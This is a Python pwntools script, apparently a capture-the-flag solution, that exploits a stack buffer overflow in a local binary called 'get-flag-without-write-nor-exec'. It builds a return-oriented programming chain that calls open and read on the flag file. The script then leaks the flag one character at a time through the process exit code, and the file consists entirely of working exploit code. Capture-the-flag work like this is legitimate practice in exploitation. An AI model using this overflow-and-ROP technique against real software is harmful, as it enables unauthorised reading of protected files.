#!/usr/bin/env python

from pwn import *


flag = ''
while len(flag) != 29:
    p = process("./get-flag-without-write-nor-exec")
    p.sendline("4")

    print(p.recv())


    buf = "A" * (16 + 8)
#0x400020:       "@"
#0x0000000000400d93 : pop rdi ; ret
#0x0000000000400d91 : pop rsi ; pop r15 ; ret

    open_plt = p.elf.plt['open']
    read_plt = p.elf.plt['read']
    exit_plt = p.elf.plt['exit']
    rdi_ret = 0x400d93
    rsi_r15_ret = 0x400d91

# open
    buf += p64(rdi_ret)
    buf += p64(0x400020)
    buf += p64(rsi_r15_ret)
    buf += p64(0)
    buf += p64(0)
    buf += p64(open_plt)

# read
    buf += p64(rdi_ret)
    buf += p64(4)
    buf += p64(rsi_r15_ret)
    buf += p64(0x602800)
    buf += p64(0x602800)
    buf += p64(read_plt)

# set rbp as target_addr + 4
#0x0000000000400940 : pop rbp ; ret
    buf += p64(0x400940)
    buf += p64(0x602800 + 0x14 + len(flag))

    buf += p64(0x400b18)
    buf += p64(0)
    buf += p64(0)
    buf += p64(0)
    buf += p64(0)
    buf += p64(0)
    buf += p64(exit_plt)


    p.sendline(buf)
    p.wait()
    ret = p.poll()
    print(ret)
    flag += chr(ret)
    p.close()

print(flag)
